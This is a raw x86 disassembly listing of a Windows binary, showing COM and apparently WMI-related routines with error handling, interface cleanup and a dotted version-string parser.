  407e8d:	test   eax,eax
  407e8f:	jns    0x407e95
  407e91:	mov    ecx,eax
  407e93:	jmp    0x407e5e
  407e95:	mov    eax,esi
  407e97:	jmp    0x407eb0
  407e99:	or     DWORD PTR [ebp-0x4],0xffffffff
  407e9d:	lea    eax,[ebp-0x2c]
  407ea0:	push   eax
  407ea1:	call   DWORD PTR ds:0x41210c
  407ea7:	test   eax,eax
  407ea9:	js     0x407e91
  407eab:	mov    eax,0x80041008
  407eb0:	call   0x40ea03
  407eb5:	ret    0x4
  407eb8:	int3   
  407eb9:	int3   
  407eba:	int3   
  407ebb:	int3   
  407ebc:	int3   
  407ebd:	push   0x20
  407ebf:	mov    eax,0x40f5f9
  407ec4:	call   0x40eab7
  407ec9:	mov    esi,edx
  407ecb:	mov    edi,ecx
  407ecd:	lea    eax,[ebp-0x2c]
  407ed0:	push   eax
  407ed1:	call   DWORD PTR ds:0x412110
  407ed7:	and    DWORD PTR [ebp-0x4],0x0
  407edb:	test   edi,edi
  407edd:	je     0x407f44
  407edf:	test   esi,esi
  407ee1:	je     0x407f44
  407ee3:	mov    BYTE PTR [ebp-0x4],0x1
  407ee7:	push   ecx
  407ee8:	lea    ecx,[ebp-0x2c]
  407eeb:	call   0x408792
  407ef0:	lea    eax,[ebp-0x2c]
  407ef3:	push   eax
  407ef4:	mov    edx,esi
  407ef6:	mov    ecx,edi
  407ef8:	call   0x407d73
  407efd:	test   eax,eax
  407eff:	jns    0x407f08
  407f01:	mov    ecx,eax
  407f03:	call   0x4090c8
  407f08:	or     DWORD PTR [ebp-0x4],0xffffffff
  407f0c:	lea    eax,[ebp-0x2c]
  407f0f:	push   eax
  407f10:	call   DWORD PTR ds:0x41210c
  407f16:	test   eax,eax
  407f18:	js     0x407f01
  407f1a:	xor    eax,eax
  407f1c:	jmp    0x407f5b
  407f1e:	mov    eax,DWORD PTR [ebp-0x1c]
  407f21:	mov    eax,DWORD PTR [eax+0x4]
  407f24:	mov    DWORD PTR [ebp-0x18],eax
  407f27:	mov    eax,0x407f2d
  407f2c:	ret    
  407f2d:	or     DWORD PTR [ebp-0x4],0xffffffff
  407f31:	lea    eax,[ebp-0x2c]
  407f34:	push   eax
  407f35:	call   DWORD PTR ds:0x41210c
  407f3b:	test   eax,eax
  407f3d:	js     0x407f01
  407f3f:	mov    eax,DWORD PTR [ebp-0x18]
  407f42:	jmp    0x407f5b
  407f44:	or     DWORD PTR [ebp-0x4],0xffffffff
  407f48:	lea    eax,[ebp-0x2c]
  407f4b:	push   eax
  407f4c:	call   DWORD PTR ds:0x41210c
  407f52:	test   eax,eax
  407f54:	js     0x407f01
  407f56:	mov    eax,0x80041008
  407f5b:	call   0x40ea03
  407f60:	ret    0x4
  407f63:	int3   
  407f64:	int3   
  407f65:	int3   
  407f66:	int3   
  407f67:	int3   
  407f68:	push   0x2c
  407f6a:	mov    eax,0x40f661
  407f6f:	call   0x40eaf2
  407f74:	mov    edi,ecx
  407f76:	xor    ebx,ebx
  407f78:	mov    DWORD PTR [ebp-0x34],ebx
  407f7b:	mov    DWORD PTR [ebp-0x30],ebx
  407f7e:	mov    DWORD PTR [ebp-0x2c],ebx
  407f81:	mov    DWORD PTR [ebp-0x20],ebx
  407f84:	mov    DWORD PTR [ebp-0x28],ebx
  407f87:	push   ebx
  407f88:	call   DWORD PTR ds:0x412014
  407f8e:	test   edi,edi
  407f90:	je     0x4082cf
  407f96:	xor    eax,eax
  407f98:	cmp    eax,0x4019e0
  407f9d:	je     0x4082cf
  407fa3:	cmp    eax,0x401750
  407fa8:	je     0x4082cf
  407fae:	cmp    eax,0x401738
  407fb3:	je     0x4082cf
  407fb9:	mov    DWORD PTR [ebp-0x4],ebx
  407fbc:	push   0x401934
  407fc1:	lea    ecx,[ebp-0x1c]
  407fc4:	call   0x40594b
  407fc9:	mov    BYTE PTR [ebp-0x4],0x1
  407fcd:	mov    eax,DWORD PTR [eax]
  407fcf:	test   eax,eax
  407fd1:	je     0x407fd7
  407fd3:	mov    eax,DWORD PTR [eax]
  407fd5:	jmp    0x407fd9
  407fd7:	mov    eax,ebx
  407fd9:	mov    esi,DWORD PTR [edi]
  407fdb:	push   ebx
  407fdc:	lea    ecx,[ebp-0x30]
  407fdf:	push   ecx
  407fe0:	push   ebx
  407fe1:	push   ebx
  407fe2:	push   eax
  407fe3:	push   edi
  407fe4:	mov    ecx,DWORD PTR [esi+0x18]
  407fe7:	call   DWORD PTR ds:0x41228c
  407fed:	call   DWORD PTR [esi+0x18]
  407ff0:	mov    esi,eax
  407ff2:	mov    DWORD PTR [ebp-0x18],esi
  407ff5:	mov    BYTE PTR [ebp-0x4],bl
  407ff8:	lea    ecx,[ebp-0x1c]
  407ffb:	call   0x4058ac
  408000:	test   esi,esi
  408002:	jns    0x40800b
  408004:	mov    ecx,esi
  408006:	call   0x4090c8
  40800b:	mov    eax,DWORD PTR [ebp-0x30]
  40800e:	mov    esi,DWORD PTR [eax]
  408010:	push   ebx
  408011:	lea    ecx,[ebp-0x2c]
  408014:	push   ecx
  408015:	push   ebx
  408016:	push   0x4019e0
  40801b:	push   eax
  40801c:	mov    ecx,DWORD PTR [esi+0x4c]
  40801f:	call   DWORD PTR ds:0x41228c
  408025:	call   DWORD PTR [esi+0x4c]
  408028:	mov    DWORD PTR [ebp-0x18],eax
  40802b:	test   eax,eax
  40802d:	jns    0x408033
  40802f:	mov    ecx,eax
  408031:	jmp    0x408006
  408033:	mov    eax,DWORD PTR [ebp-0x2c]
  408036:	mov    esi,DWORD PTR [eax]
  408038:	lea    ecx,[ebp-0x20]
  40803b:	push   ecx
  40803c:	push   ebx
  40803d:	push   eax
  40803e:	mov    ecx,DWORD PTR [esi+0x3c]
  408041:	call   DWORD PTR ds:0x41228c
  408047:	call   DWORD PTR [esi+0x3c]
  40804a:	mov    DWORD PTR [ebp-0x18],eax
  40804d:	test   eax,eax
  40804f:	js     0x40802f
  408051:	push   0x40194c
  408056:	lea    ecx,[ebp-0x1c]
  408059:	call   0x40594b
  40805e:	mov    BYTE PTR [ebp-0x4],0x2
  408062:	mov    edx,DWORD PTR [eax]
  408064:	test   edx,edx
  408066:	je     0x40806c
  408068:	mov    edx,DWORD PTR [edx]
  40806a:	jmp    0x40806e
  40806c:	mov    edx,ebx
  40806e:	push   ecx
  40806f:	mov    ecx,DWORD PTR [ebp-0x20]
  408072:	call   0x407ebd
  408077:	mov    esi,eax
  408079:	mov    DWORD PTR [ebp-0x18],esi
  40807c:	mov    BYTE PTR [ebp-0x4],bl
  40807f:	lea    ecx,[ebp-0x1c]
  408082:	call   0x4058ac
  408087:	test   esi,esi
  408089:	js     0x408004
  40808f:	push   0x40195c
  408094:	lea    ecx,[ebp-0x1c]
  408097:	call   0x40594b
  40809c:	mov    BYTE PTR [ebp-0x4],0x3
  4080a0:	mov    edx,DWORD PTR [eax]
  4080a2:	test   edx,edx
  4080a4:	je     0x4080aa
  4080a6:	mov    edx,DWORD PTR [edx]
  4080a8:	jmp    0x4080ac
  4080aa:	mov    edx,ebx
  4080ac:	push   0x401750
  4080b1:	mov    ecx,DWORD PTR [ebp-0x20]
  4080b4:	call   0x407e0b
  4080b9:	mov    esi,eax
  4080bb:	mov    DWORD PTR [ebp-0x18],esi
  4080be:	mov    BYTE PTR [ebp-0x4],bl
  4080c1:	lea    ecx,[ebp-0x1c]
  4080c4:	call   0x4058ac
  4080c9:	test   esi,esi
  4080cb:	js     0x408004
  4080d1:	push   0x401974
  4080d6:	lea    ecx,[ebp-0x1c]
  4080d9:	call   0x40594b
  4080de:	mov    BYTE PTR [ebp-0x4],0x4
  4080e2:	mov    edx,DWORD PTR [eax]
  4080e4:	test   edx,edx
  4080e6:	je     0x4080ec
  4080e8:	mov    edx,DWORD PTR [edx]
  4080ea:	jmp    0x4080ee
  4080ec:	mov    edx,ebx
  4080ee:	push   0x401738
  4080f3:	mov    ecx,DWORD PTR [ebp-0x20]
  4080f6:	call   0x407e0b
  4080fb:	mov    esi,eax
  4080fd:	mov    DWORD PTR [ebp-0x18],esi
  408100:	mov    BYTE PTR [ebp-0x4],bl
  408103:	lea    ecx,[ebp-0x1c]
  408106:	call   0x4058ac
  40810b:	test   esi,esi
  40810d:	js     0x408004
  408113:	push   0x4019e0
  408118:	lea    ecx,[ebp-0x24]
  40811b:	call   0x40594b
  408120:	mov    esi,eax
  408122:	mov    BYTE PTR [ebp-0x4],0x5
  408126:	push   0x401934
  40812b:	lea    ecx,[ebp-0x1c]
  40812e:	call   0x40594b
  408133:	mov    BYTE PTR [ebp-0x4],0x6
  408137:	mov    ecx,DWORD PTR [esi]
  408139:	test   ecx,ecx
  40813b:	je     0x408141
  40813d:	mov    ecx,DWORD PTR [ecx]
  40813f:	jmp    0x408143
  408141:	mov    ecx,ebx
  408143:	mov    eax,DWORD PTR [eax]
  408145:	test   eax,eax
  408147:	je     0x40814d
  408149:	mov    eax,DWORD PTR [eax]
  40814b:	jmp    0x40814f
  40814d:	mov    eax,ebx
  40814f:	mov    esi,DWORD PTR [edi]
  408151:	push   ebx
  408152:	lea    edx,[ebp-0x28]
  408155:	push   edx
  408156:	push   DWORD PTR [ebp-0x20]
  408159:	push   ebx
  40815a:	push   ebx
  40815b:	push   ecx
  40815c:	push   eax
  40815d:	push   edi
  40815e:	mov    ecx,DWORD PTR [esi+0x60]
  408161:	call   DWORD PTR ds:0x41228c
  408167:	call   DWORD PTR [esi+0x60]
  40816a:	mov    esi,eax
  40816c:	mov    DWORD PTR [ebp-0x18],esi
  40816f:	mov    BYTE PTR [ebp-0x4],0x5
  408173:	lea    ecx,[ebp-0x1c]
  408176:	call   0x4058ac
  40817b:	mov    BYTE PTR [ebp-0x4],bl
  40817e:	lea    ecx,[ebp-0x24]
  408181:	call   0x4058ac
  408186:	test   esi,esi
  408188:	js     0x408004
  40818e:	cmp    DWORD PTR [ebp-0x28],0x0
  408192:	jne    0x40819e
  408194:	mov    ecx,0x800300fd
  408199:	jmp    0x408006
  40819e:	push   0x40198c
  4081a3:	lea    ecx,[ebp-0x24]
  4081a6:	call   0x40594b
  4081ab:	mov    BYTE PTR [ebp-0x4],0x7
  4081af:	mov    eax,DWORD PTR [eax]
  4081b1:	test   eax,eax
  4081b3:	je     0x4081b9
  4081b5:	mov    edx,DWORD PTR [eax]
  4081b7:	jmp    0x4081bb
  4081b9:	mov    edx,ebx
  4081bb:	push   ecx
  4081bc:	lea    eax,[ebp-0x34]
  4081bf:	push   eax
  4081c0:	mov    ecx,DWORD PTR [ebp-0x28]
  4081c3:	call   0x40799a
  4081c8:	mov    esi,eax
  4081ca:	mov    BYTE PTR [ebp-0x4],bl
  4081cd:	lea    ecx,[ebp-0x24]
  4081d0:	call   0x4058ac
  4081d5:	test   esi,esi
  4081d7:	je     0x408194
  4081d9:	cmp    DWORD PTR [ebp-0x34],0x0
  4081dd:	jne    0x408194
  4081df:	push   ebx
  4081e0:	push   0x1
  4081e2:	mov    edx,0x4019a4
  4081e7:	mov    ecx,0x4019e0
  4081ec:	call   0x40a31f
  4081f1:	lea    ecx,[ebp-0x24]
  4081f4:	test   eax,eax
  4081f6:	jne    0x408238
  4081f8:	push   0x4019c0
  4081fd:	call   0x40594b
  408202:	mov    BYTE PTR [ebp-0x4],0x8
  408206:	mov    edx,DWORD PTR [eax]
  408208:	test   edx,edx
  40820a:	je     0x408210
  40820c:	mov    edx,DWORD PTR [edx]
  40820e:	jmp    0x408212
  408210:	mov    edx,ebx
  408212:	push   DWORD PTR [ebp+0x14]
  408215:	mov    ecx,DWORD PTR [ebp-0x28]
  408218:	call   0x40760b
  40821d:	mov    edi,eax
  40821f:	mov    DWORD PTR [ebp-0x18],edi
  408222:	mov    BYTE PTR [ebp-0x4],bl
  408225:	lea    ecx,[ebp-0x24]
  408228:	call   0x4058ac
  40822d:	test   edi,edi
  40822f:	jns    0x408248
  408231:	mov    ecx,edi
  408233:	jmp    0x408006
  408238:	push   0x4019d0
  40823d:	call   0x40594b
  408242:	mov    BYTE PTR [ebp-0x4],0x9
  408246:	jmp    0x408206
  408248:	or     DWORD PTR [ebp-0x4],0xffffffff
  40824c:	jmp    0x408266
  40824e:	mov    eax,DWORD PTR [ebp-0x38]
  408251:	mov    eax,DWORD PTR [eax+0x4]
  408254:	mov    DWORD PTR [ebp-0x18],eax
  408257:	mov    eax,0x40825d
  40825c:	ret    
  40825d:	or     DWORD PTR [ebp-0x4],0xffffffff
  408261:	xor    ebx,ebx
  408263:	mov    edi,DWORD PTR [ebp-0x18]
  408266:	mov    ecx,DWORD PTR [ebp-0x30]
  408269:	test   ecx,ecx
  40826b:	je     0x408280
  40826d:	mov    eax,DWORD PTR [ecx]
  40826f:	push   ecx
  408270:	mov    esi,DWORD PTR [eax+0x8]
  408273:	mov    ecx,esi
  408275:	call   DWORD PTR ds:0x41228c
  40827b:	call   esi
  40827d:	mov    DWORD PTR [ebp-0x30],ebx
  408280:	mov    ecx,DWORD PTR [ebp-0x2c]
  408283:	test   ecx,ecx
  408285:	je     0x40829a
  408287:	mov    eax,DWORD PTR [ecx]
  408289:	push   ecx
  40828a:	mov    esi,DWORD PTR [eax+0x8]
  40828d:	mov    ecx,esi
  40828f:	call   DWORD PTR ds:0x41228c
  408295:	call   esi
  408297:	mov    DWORD PTR [ebp-0x2c],ebx
  40829a:	mov    ecx,DWORD PTR [ebp-0x20]
  40829d:	test   ecx,ecx
  40829f:	je     0x4082b4
  4082a1:	mov    eax,DWORD PTR [ecx]
  4082a3:	push   ecx
  4082a4:	mov    esi,DWORD PTR [eax+0x8]
  4082a7:	mov    ecx,esi
  4082a9:	call   DWORD PTR ds:0x41228c
  4082af:	call   esi
  4082b1:	mov    DWORD PTR [ebp-0x20],ebx
  4082b4:	mov    ecx,DWORD PTR [ebp-0x28]
  4082b7:	test   ecx,ecx
  4082b9:	je     0x4082cb
  4082bb:	mov    eax,DWORD PTR [ecx]
  4082bd:	push   ecx
  4082be:	mov    esi,DWORD PTR [eax+0x8]
  4082c1:	mov    ecx,esi
  4082c3:	call   DWORD PTR ds:0x41228c
  4082c9:	call   esi
  4082cb:	mov    eax,edi
  4082cd:	jmp    0x4082d4
  4082cf:	mov    eax,0x80041008
  4082d4:	call   0x40ea30
  4082d9:	ret    0x10
  4082dc:	int3   
  4082dd:	int3   
  4082de:	int3   
  4082df:	int3   
  4082e0:	int3   
  4082e1:	push   0x1c
  4082e3:	mov    eax,0x40f69b
  4082e8:	call   0x40eab7
  4082ed:	mov    ebx,ecx
  4082ef:	lea    eax,[ebp-0x28]
  4082f2:	push   eax
  4082f3:	call   DWORD PTR ds:0x412110
  4082f9:	xor    esi,esi
  4082fb:	mov    DWORD PTR [ebp-0x4],esi
  4082fe:	push   esi
  4082ff:	call   DWORD PTR ds:0x412014
  408305:	test   ebx,ebx
  408307:	je     0x4083ef
  40830d:	xor    eax,eax
  40830f:	cmp    eax,0x401750
  408314:	je     0x4083ef
  40831a:	cmp    eax,0x401738
  40831f:	je     0x4083ef
  408325:	mov    BYTE PTR [ebp-0x4],0x1
  408329:	mov    edi,DWORD PTR [ebp+0x10]
  40832c:	cmp    DWORD PTR [ebp+0x14],eax
  40832f:	je     0x40833c
  408331:	push   DWORD PTR [ebp+0x14]
  408334:	mov    ecx,edi
  408336:	call   DWORD PTR ds:0x4121b0
  40833c:	lea    eax,[ebp-0x28]
  40833f:	push   eax
  408340:	sub    esp,0xc
  408343:	mov    ecx,ebx
  408345:	call   0x407f68
  40834a:	test   eax,eax
  40834c:	jns    0x40836b
  40834e:	mov    ecx,eax
  408350:	call   0x407454
  408355:	or     DWORD PTR [ebp-0x4],0xffffffff
  408359:	lea    ecx,[ebp-0x28]
  40835c:	call   0x40893a
  408361:	xor    eax,eax
  408363:	call   0x40ea03
  408368:	ret    0x10
  40836b:	push   0x8
  40836d:	pop    eax
  40836e:	cmp    ax,WORD PTR [ebp-0x28]
  408372:	jne    0x4083bf
  408374:	lea    eax,[ebp-0x28]
  408377:	push   eax
  408378:	lea    ecx,[ebp-0x14]
  40837b:	call   0x4088cb
  408380:	mov    BYTE PTR [ebp-0x4],0x2
  408384:	mov    eax,DWORD PTR [eax]
  408386:	test   eax,eax
  408388:	je     0x40838c
  40838a:	mov    esi,DWORD PTR [eax]
  40838c:	push   esi
  40838d:	mov    ecx,edi
  40838f:	call   DWORD PTR ds:0x4121b0
  408395:	mov    BYTE PTR [ebp-0x4],0x1
  408399:	lea    ecx,[ebp-0x14]
  40839c:	call   0x4058ac
  4083a1:	or     DWORD PTR [ebp-0x4],0xffffffff
  4083a5:	lea    eax,[ebp-0x28]
  4083a8:	push   eax
  4083a9:	call   DWORD PTR ds:0x41210c
  4083af:	test   eax,eax
  4083b1:	jns    0x4083ba
  4083b3:	mov    ecx,eax
  4083b5:	call   0x4090c8
  4083ba:	xor    eax,eax
  4083bc:	inc    eax
  4083bd:	jmp    0x408363
  4083bf:	mov    ecx,0x80041008
  4083c4:	jmp    0x408350
  4083c6:	mov    eax,DWORD PTR [ebp-0x18]
  4083c9:	mov    ecx,DWORD PTR [eax+0x4]
  4083cc:	call   0x407454
  4083d1:	mov    eax,0x4083d7
  4083d6:	ret    
  4083d7:	or     DWORD PTR [ebp-0x4],0xffffffff
  4083db:	lea    eax,[ebp-0x28]
  4083de:	push   eax
  4083df:	call   DWORD PTR ds:0x41210c
  4083e5:	test   eax,eax
  4083e7:	jns    0x408361
  4083ed:	jmp    0x4083b3
  4083ef:	mov    ecx,0x80041008
  4083f4:	call   0x407454
  4083f9:	jmp    0x4083d7
  4083fb:	int3   
  4083fc:	int3   
  4083fd:	int3   
  4083fe:	int3   
  4083ff:	int3   
  408400:	push   0x2c
  408402:	mov    eax,0x40f6f9
  408407:	call   0x40eaf2
  40840c:	mov    DWORD PTR [ebp-0x24],edx
  40840f:	mov    ebx,ecx
  408411:	xor    edi,edi
  408413:	mov    DWORD PTR [ebp-0x30],edi
  408416:	lea    ecx,[ebp-0x18]
  408419:	call   DWORD PTR ds:0x4121c4
  40841f:	mov    DWORD PTR [ebp-0x4],edi
  408422:	mov    DWORD PTR [ebp-0x20],edi
  408425:	mov    DWORD PTR [ebp-0x1c],edi
  408428:	push   edi
  408429:	call   DWORD PTR ds:0x412014
  40842f:	test   ebx,ebx
  408431:	jne    0x408452
  408433:	mov    ecx,0x80041008
  408438:	call   0x407454
  40843d:	or     DWORD PTR [ebp-0x4],0xffffffff
  408441:	lea    ecx,[ebp-0x18]
  408444:	call   DWORD PTR ds:0x4121c0
  40844a:	xor    eax,eax
  40844c:	call   0x40ea30
  408451:	ret    
  408452:	mov    BYTE PTR [ebp-0x4],0x1
  408456:	push   0x4010bc
  40845b:	lea    ecx,[ebp-0x28]
  40845e:	call   0x40594b
  408463:	mov    BYTE PTR [ebp-0x4],0x2
  408467:	mov    eax,DWORD PTR [eax]
  408469:	test   eax,eax
  40846b:	je     0x408471
  40846d:	mov    eax,DWORD PTR [eax]
  40846f:	jmp    0x408473
  408471:	mov    eax,edi
  408473:	mov    esi,DWORD PTR [ebx]
  408475:	lea    ecx,[ebp-0x1c]
  408478:	push   ecx
  408479:	push   edi
  40847a:	push   0x30
  40847c:	push   eax
  40847d:	push   ebx
  40847e:	mov    ecx,DWORD PTR [esi+0x48]
  408481:	call   DWORD PTR ds:0x41228c
  408487:	call   DWORD PTR [esi+0x48]
  40848a:	mov    esi,eax
  40848c:	mov    BYTE PTR [ebp-0x4],0x1
  408490:	lea    ecx,[ebp-0x28]
  408493:	call   0x4058ac
  408498:	test   esi,esi
  40849a:	jns    0x4084a3
  40849c:	mov    ecx,esi
  40849e:	call   0x4090c8
  4084a3:	mov    edx,DWORD PTR [ebp-0x24]
  4084a6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4084a9:	call   0x4070c8
  4084ae:	test   eax,eax
  4084b0:	jns    0x4084b6
  4084b2:	mov    ecx,eax
  4084b4:	jmp    0x40849e
  4084b6:	mov    eax,DWORD PTR [ebp-0x1c]
  4084b9:	mov    esi,DWORD PTR [eax]
  4084bb:	lea    ecx,[ebp-0x30]
  4084be:	push   ecx
  4084bf:	lea    ecx,[ebp-0x20]
  4084c2:	push   ecx
  4084c3:	push   0x1
  4084c5:	push   0xffffffff
  4084c7:	push   eax
  4084c8:	mov    ecx,DWORD PTR [esi+0x10]
  4084cb:	call   DWORD PTR ds:0x41228c
  4084d1:	call   DWORD PTR [esi+0x10]
  4084d4:	test   eax,eax
  4084d6:	js     0x4084b2
  4084d8:	cmp    DWORD PTR [ebp-0x30],0x0
  4084dc:	jne    0x408523
  4084de:	xor    ecx,ecx
  4084e0:	inc    ecx
  4084e1:	call   0x407454
  4084e6:	mov    ecx,DWORD PTR [ebp-0x20]
  4084e9:	test   ecx,ecx
  4084eb:	je     0x408500
  4084ed:	mov    eax,DWORD PTR [ecx]
  4084ef:	push   ecx
  4084f0:	mov    esi,DWORD PTR [eax+0x8]
  4084f3:	mov    ecx,esi
  4084f5:	call   DWORD PTR ds:0x41228c
  4084fb:	call   esi
  4084fd:	mov    DWORD PTR [ebp-0x20],edi
  408500:	mov    ecx,DWORD PTR [ebp-0x1c]
  408503:	test   ecx,ecx
  408505:	je     0x40843d
  40850b:	mov    eax,DWORD PTR [ecx]
  40850d:	push   ecx
  40850e:	mov    esi,DWORD PTR [eax+0x8]
  408511:	mov    ecx,esi
  408513:	call   DWORD PTR ds:0x41228c
  408519:	call   esi
  40851b:	mov    DWORD PTR [ebp-0x1c],edi
  40851e:	jmp    0x40843d
  408523:	mov    ecx,0x138d
  408528:	call   0x4098dc
  40852d:	push   eax
  40852e:	lea    eax,[ebp-0x18]
  408531:	push   eax
  408532:	mov    edx,0x401108
  408537:	mov    ecx,DWORD PTR [ebp-0x20]
  40853a:	call   0x4078a4
  40853f:	mov    ecx,DWORD PTR [ebp-0x20]
  408542:	test   eax,eax
  408544:	je     0x4084e9
  408546:	test   ecx,ecx
  408548:	je     0x40855d
  40854a:	mov    eax,DWORD PTR [ecx]
  40854c:	push   ecx
  40854d:	mov    esi,DWORD PTR [eax+0x8]
  408550:	mov    ecx,esi
  408552:	call   DWORD PTR ds:0x41228c
  408558:	call   esi
  40855a:	mov    DWORD PTR [ebp-0x20],edi
  40855d:	mov    ecx,DWORD PTR [ebp-0x1c]
  408560:	test   ecx,ecx
  408562:	je     0x408577
  408564:	mov    eax,DWORD PTR [ecx]
  408566:	push   ecx
  408567:	mov    esi,DWORD PTR [eax+0x8]
  40856a:	mov    ecx,esi
  40856c:	call   DWORD PTR ds:0x41228c
  408572:	call   esi
  408574:	mov    DWORD PTR [ebp-0x1c],edi
  408577:	mov    DWORD PTR [ebp-0x2c],edi
  40857a:	push   0x2e
  40857c:	lea    ecx,[ebp-0x18]
  40857f:	call   DWORD PTR ds:0x4121cc
  408585:	mov    esi,eax
  408587:	mov    DWORD PTR [ebp-0x28],esi
  40858a:	cmp    esi,0xffffffff
  40858d:	jne    0x4085b2
  40858f:	push   edi
  408590:	mov    ecx,DWORD PTR [ebp-0x18]
  408593:	call   0x409ba8
  408598:	test   eax,eax
  40859a:	je     0x40843d
  4085a0:	mov    ecx,DWORD PTR [ebp-0x18]
  4085a3:	call   0x409aea
  4085a8:	mov    esi,eax
  4085aa:	mov    DWORD PTR [ebp-0x2c],esi
  4085ad:	jmp    0x4086d4
  4085b2:	push   esi
  4085b3:	push   edi
  4085b4:	lea    eax,[ebp-0x24]
  4085b7:	push   eax
  4085b8:	lea    ecx,[ebp-0x18]
  4085bb:	call   DWORD PTR ds:0x4121d8
  4085c1:	mov    BYTE PTR [ebp-0x4],0x3
  4085c5:	push   edi
  4085c6:	mov    ecx,DWORD PTR [eax]
  4085c8:	call   0x409ba8
  4085cd:	mov    ebx,eax
  4085cf:	neg    ebx
  4085d1:	sbb    bl,bl
  4085d3:	mov    BYTE PTR [ebp-0x4],0x1
  4085d7:	lea    ecx,[ebp-0x24]
  4085da:	call   DWORD PTR ds:0x4121c0
  4085e0:	add    bl,0x1
  4085e3:	jne    0x40843d
  4085e9:	push   esi
  4085ea:	push   edi
  4085eb:	lea    eax,[ebp-0x24]
  4085ee:	push   eax
  4085ef:	lea    ecx,[ebp-0x18]
  4085f2:	call   DWORD PTR ds:0x4121d8
  4085f8:	mov    BYTE PTR [ebp-0x4],0x4
  4085fc:	mov    ecx,DWORD PTR [eax]
  4085fe:	call   0x409aea
  408603:	mov    esi,eax
  408605:	mov    DWORD PTR [ebp-0x2c],esi
  408608:	mov    BYTE PTR [ebp-0x4],0x1
  40860c:	lea    ecx,[ebp-0x24]
  40860f:	call   DWORD PTR ds:0x4121c0
  408615:	mov    eax,DWORD PTR [ebp-0x28]
  408618:	inc    eax
  408619:	push   eax
  40861a:	lea    eax,[ebp-0x24]
  40861d:	push   eax
  40861e:	lea    ecx,[ebp-0x18]
  408621:	call   DWORD PTR ds:0x4121ac
  408627:	mov    BYTE PTR [ebp-0x4],0x5
  40862b:	push   eax
  40862c:	lea    ecx,[ebp-0x18]
  40862f:	call   DWORD PTR ds:0x4121bc
  408635:	mov    BYTE PTR [ebp-0x4],0x1
  408639:	lea    ecx,[ebp-0x24]
  40863c:	call   DWORD PTR ds:0x4121c0
  408642:	push   0x2e
  408644:	lea    ecx,[ebp-0x18]
  408647:	call   DWORD PTR ds:0x4121cc
  40864d:	mov    DWORD PTR [ebp-0x28],eax
  408650:	cmp    eax,0xffffffff
  408653:	jne    0x408672
  408655:	push   edi
  408656:	mov    ecx,DWORD PTR [ebp-0x18]
  408659:	call   0x409ba8
  40865e:	test   eax,eax
  408660:	je     0x40843d
  408666:	mov    ecx,DWORD PTR [ebp-0x18]
  408669:	call   0x409aea
  40866e:	mov    edi,eax
  408670:	jmp    0x4086d4
  408672:	push   eax
  408673:	push   edi
  408674:	lea    eax,[ebp-0x24]
  408677:	push   eax
  408678:	lea    ecx,[ebp-0x18]
  40867b:	call   DWORD PTR ds:0x4121d8
  408681:	mov    BYTE PTR [ebp-0x4],0x6
  408685:	push   edi
  408686:	mov    ecx,DWORD PTR [eax]
  408688:	call   0x409ba8
  40868d:	mov    ebx,eax
  40868f:	neg    ebx
  408691:	sbb    bl,bl
  408693:	mov    BYTE PTR [ebp-0x4],0x1
  408697:	lea    ecx,[ebp-0x24]
  40869a:	call   DWORD PTR ds:0x4121c0
  4086a0:	add    bl,0x1
  4086a3:	jne    0x40843d
  4086a9:	push   DWORD PTR [ebp-0x28]
  4086ac:	push   edi
  4086ad:	lea    eax,[ebp-0x24]
  4086b0:	push   eax
  4086b1:	lea    ecx,[ebp-0x18]
  4086b4:	call   DWORD PTR ds:0x4121d8
  4086ba:	mov    BYTE PTR [ebp-0x4],0x7
  4086be:	mov    ecx,DWORD PTR [eax]
  4086c0:	call   0x409aea
  4086c5:	mov    edi,eax
  4086c7:	mov    BYTE PTR [ebp-0x4],0x1
  4086cb:	lea    ecx,[ebp-0x24]
  4086ce:	call   DWORD PTR ds:0x4121c0
  4086d4:	imul   esi,esi,0x3e8
  4086da:	add    esi,edi
  4086dc:	mov    DWORD PTR [ebp-0x34],esi
  4086df:	or     DWORD PTR [ebp-0x4],0xffffffff
  4086e3:	lea    ecx,[ebp-0x18]
  4086e6:	call   DWORD PTR ds:0x4121c0
  4086ec:	mov    eax,esi
  4086ee:	jmp    0x40844c
  4086f3:	mov    eax,DWORD PTR [ebp-0x38]
  4086f6:	mov    ecx,DWORD PTR [eax+0x4]
  4086f9:	call   0x407454
  4086fe:	mov    ecx,DWORD PTR [ebp-0x20]
  408701:	test   ecx,ecx
  408703:	je     0x40871c
  408705:	mov    eax,DWORD PTR [ecx]
  408707:	push   ecx
  408708:	mov    esi,DWORD PTR [eax+0x8]
  40870b:	mov    ecx,esi
  40870d:	call   DWORD PTR ds:0x41228c
  408713:	call   esi
  408715:	xor    edi,edi
  408717:	mov    DWORD PTR [ebp-0x20],edi
  40871a:	jmp    0x40871e
  40871c:	xor    edi,edi
  40871e:	mov    ecx,DWORD PTR [ebp-0x1c]
  408721:	test   ecx,ecx
  408723:	je     0x408738
  408725:	mov    eax,DWORD PTR [ecx]
  408727:	push   ecx
  408728:	mov    esi,DWORD PTR [eax+0x8]
  40872b:	mov    ecx,esi
  40872d:	call   DWORD PTR ds:0x41228c
  408733:	call   esi
  408735:	mov    DWORD PTR [ebp-0x1c],edi
  408738:	mov    eax,0x40873e
  40873d:	ret    
  40873e:	jmp    0x40843d
  408743:	mov    ecx,0x80041006
  408748:	call   0x407454
  40874d:	mov    ecx,DWORD PTR [ebp-0x20]
  408750:	test   ecx,ecx
  408752:	je     0x40876b
  408754:	mov    eax,DWORD PTR [ecx]
  408756:	push   ecx
  408757:	mov    esi,DWORD PTR [eax+0x8]
  40875a:	mov    ecx,esi
  40875c:	call   DWORD PTR ds:0x41228c
  408762:	call   esi
  408764:	xor    edi,edi
  408766:	mov    DWORD PTR [ebp-0x20],edi
  408769:	jmp    0x40876d
  40876b:	xor    edi,edi
  40876d:	mov    ecx,DWORD PTR [ebp-0x1c]
  408770:	test   ecx,ecx
  408772:	je     0x408787
  408774:	mov    eax,DWORD PTR [ecx]
  408776:	push   ecx
  408777:	mov    esi,DWORD PTR [eax+0x8]
  40877a:	mov    ecx,esi
  40877c:	call   DWORD PTR ds:0x41228c
  408782:	call   esi
  408784:	mov    DWORD PTR [ebp-0x1c],edi
  408787:	mov    eax,0x40843d
  40878c:	ret    
  40878d:	int3   
  40878e:	int3   
  40878f:	int3   
  408790:	int3   
  408791:	int3   
  408792:	mov    edi,edi
  408794:	push   esi
  408795:	push   edi
  408796:	mov    esi,ecx
  408798:	push   0x3
  40879a:	pop    edi
  40879b:	movzx  eax,WORD PTR [esi]
  40879e:	cmp    ax,di
  4087a1:	je     0x4087c4
